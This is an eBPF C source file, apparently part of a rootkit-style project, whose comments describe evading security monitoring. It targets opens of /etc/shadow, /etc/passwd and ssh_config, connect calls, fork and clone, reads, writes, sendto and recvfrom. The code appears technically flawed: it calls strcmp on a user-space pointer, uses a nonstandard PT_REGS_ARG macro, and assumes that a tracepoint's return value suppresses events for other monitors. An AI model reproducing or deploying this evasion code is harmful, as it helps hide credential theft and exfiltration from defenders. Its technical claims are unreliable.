#include <linux/bpf.h>
#include <linux/ptrace.h>
#include <linux/unistd.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_core_read.h>
#include <string.h>


//same map as before 
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, int);
    __type(value, int);
} ignore_map SEC(".maps");
// bypass the file read detectionn for imp files 
//ignores the open syscall for useful imp files 
//checks if the file being opened is /etc/shadow /etc/passwd or ssh_config 
// if it is check the ignore map for key 3
// if value is 1 then returns 0 that means ignore the event 
//else process the event 


SEC("tracepoint/syscalls/sys_enter_open")
int bpf_prog_open(struct pt_regs *ctx) {
    char *filename = (char *)PT_REGS_ARG(ctx, 0);
    if (filename) {
        if (strcmp(filename, "/etc/shadow") == 0 || 
            strcmp(filename, "/etc/passwd") == 0 || 
            strcmp(filename, "/etc/ssh/ssh_config") == 0) {
            int key = 3;
            int *val = bpf_map_lookup_elem(&ignore_map, &key);
            if (val && *val == 1) {
                return 0;
            }
        }
    }
    return 1;
}

//hooking into the tracepoint sys_enter_connect which triggers when a process attempts to execute the connect() syscall to make a connection 
SEC("tracepoint/syscalls/sys_enter_connect")
int bpf_prog_connect(struct pt_regs *ctx) {
    int key = 2;
    int *val = bpf_map_lookup_elem(&ignore_map, &key);
    if (val && *val == 1) {
        return 0;
    }
    return 1;
}//same methid to bypass that 


// bypass process spawning
SEC("tracepoint/syscalls/sys_enter_fork")
int bpf_prog_fork(struct pt_regs *ctx) {
    return 0;//always ignore this event 
}
SEC("tracepoint/syscalls/sys_enter_clone")
int bpf_prog_clone(struct pt_regs *ctx) {
    return 0;//ignore process cloning too
    
}
//bypass file read and write 
SEC("tracepoint/syscalls/sys_enter_read")
int bpf_prog_read(struct pt_regs *ctx) {
    return 0;
}
SEC("tracepoint/syscalls/sys_enter_write")
int bpf_prog_write(struct pt_regs *ctx) {
    return 0;
}
//bypass network send and recivee
SEC("tracepoint/syscalls/sys_enter_sendto")
int bpf_prog_sendto(struct pt_regs *ctx) {
    return 0;
}
SEC("tracepoint/syscalls/sys_enter_recvfrom")
int bpf_prog_recvfrom(struct pt_regs *ctx) {
    return 0;
}

char _license[] SEC("license") = "GPL";

